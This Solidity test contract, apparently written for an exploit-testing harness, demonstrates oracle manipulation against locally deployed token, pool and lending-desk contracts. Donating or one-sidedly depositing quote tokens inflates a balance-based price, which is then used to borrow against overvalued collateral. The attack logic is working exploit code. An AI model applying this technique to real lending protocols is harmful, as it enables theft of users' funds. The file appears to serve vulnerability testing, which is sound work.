// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {PlainToken} from "../src/PlainToken.sol";
import {ReferencePool} from "../src/ReferencePool.sol";
import {LoanDesk} from "../src/LoanDesk.sol";

/// @notice Oracle manipulation without a trade: the price comes from the token balances of the
///         pool, so tokens that are sent or deposited in one sided raise it. The desk then values
///         the attacker's collateral at the raised price and lends against it.
/// Knobs:
///   0 `route`         0: the attacker transfers quote tokens straight to the pool; 1: it adds
///                     them with `deposit(0, amount)`;
///   1 `donation_bps`  the part of the attacker's quote tokens that moves the price, in basis
///                     points.
/// The pool holds 1000 base and 1000 quote tokens (price 1), the desk holds 50000 quote tokens
/// to lend. The attacker holds 10000 base and 2000 quote tokens, which it values at the price
/// before the attack. It raises the price, locks all its base tokens and borrows the most the
/// desk allows. The predicate compares the value of the attacker's tokens before and after.
contract LoanDeskDonationPoC is AssayPoC {
    uint256 private constant BPS = 10_000;
    uint256 private constant ATTACKER_BASE = 10_000e18;
    uint256 private constant ATTACKER_QUOTE = 2_000e18;

    PlainToken internal base;
    PlainToken internal quote;
    ReferencePool internal pool;
    LoanDesk internal desk;

    function setUpTarget() internal override {
        base = new PlainToken();
        quote = new PlainToken();
        pool = new ReferencePool(base, quote);
        desk = new LoanDesk(pool);

        address maker = makeAddr("maker");
        base.mint(maker, 1_000e18);
        quote.mint(maker, 1_000e18);
        vm.startPrank(maker);
        base.approve(address(pool), type(uint256).max);
        quote.approve(address(pool), type(uint256).max);
        pool.deposit(1_000e18, 1_000e18);
        vm.stopPrank();
        quote.mint(address(desk), 50_000e18);

        declareKnob(0, "route", 0, 0, 1);
        declareKnob(1, "donation_bps", BPS, 1, BPS);
    }

    /// @dev Base and quote tokens at the price of 1 that the pool had before the attack.
    function _value(address who) private view returns (uint256) {
        return base.balanceOf(who) + quote.balanceOf(who);
    }

    function exploit() internal override {
        base.mint(attacker, ATTACKER_BASE);
        quote.mint(attacker, ATTACKER_QUOTE);
        uint256 valueBefore = _value(attacker);
        uint256 donation = ATTACKER_QUOTE * knob(1) / BPS;

        vm.startPrank(attacker);
        if (knob(0) == 0) {
            quote.transfer(address(pool), donation);
        } else {
            quote.approve(address(pool), donation);
            pool.deposit(0, donation);
        }
        base.approve(address(desk), ATTACKER_BASE);
        desk.lock(ATTACKER_BASE);
        desk.borrow(desk.maxLoan(attacker));
        vm.stopPrank();

        attacker_profit("usd_value", valueBefore, _value(attacker));
    }
}
